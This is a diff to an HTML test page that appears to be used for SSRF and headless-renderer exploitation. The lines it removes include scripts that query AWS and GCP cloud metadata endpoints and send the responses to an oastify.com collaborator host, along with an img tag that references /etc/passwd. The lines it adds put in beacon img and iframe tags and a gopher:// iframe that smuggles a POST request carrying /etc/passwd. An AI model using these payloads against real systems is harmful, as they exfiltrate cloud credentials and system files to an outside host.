@@ -7,34 +7,13 @@
 </head>
 <body>
     This website is for testing
-    <img src="file:///etc/passwd" onerror="window.location='https://uusvy23h6xw4kzyaw0hcsy3zeqki89wy.oastify.com/javascriptisExcuted'">
+    <img src="https://uusvy23h6xw4kzyaw0hcsy3zeqki89wy.oastify.com/?fromimagetag" onerror="window.location='https://uusvy23h6xw4kzyaw0hcsy3zeqki89wy.oastify.com/javascriptisExcuted'">
+<iframe src="https://uusvy23h6xw4kzyaw0hcsy3zeqki89wy.oastify.com/?fromiframe"></iframe>
+    <iframe src="gopher://127.0.0.1:80/_POST%20/log.php%20HTTP/1.1%0D%0AHost:%20uusvy23h6xw4kzyaw0hcsy3zeqki89wy.oastify.com%0D%0AContent-Length:%2020%0D%0A%0D%0Afile:///etc/passwd
+"></iframe>
+  
+    
 
-    <script>
-        var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://uusvy23h6xw4kzyaw0hcsy3zeqki89wy.oastify.com", true);
-xhr.onload = function() {
-  fetch("http://uusvy23h6xw4kzyaw0hcsy3zeqki89wy.oastify.com/thisisfromxml?data=" + encodeURIComponent(xhr.responseText));
-};
-xhr.send();
-
-    </script>
-    <script>
-        var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://169.254.169.254/latest/meta-data/", true);
-xhr.onload = function() {
-  fetch("http://kf3ljso7rnhu5pj0hq22doopzg57t0hp.oastify.com/log?data=" + encodeURIComponent(xhr.responseText));
-};
-xhr.send();
-
-    </script>
-    <script>
-        var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://metadata.google.internal/computeMetadata/v1/", true);
-xhr.onload = function() {
-  fetch("http://kf3ljso7rnhu5pj0hq22doopzg57t0hp.oastify.com/log?data=" + encodeURIComponent(xhr.responseText));
-};
-xhr.send();
-
-    </script>
+ 
 </body>
 </html>
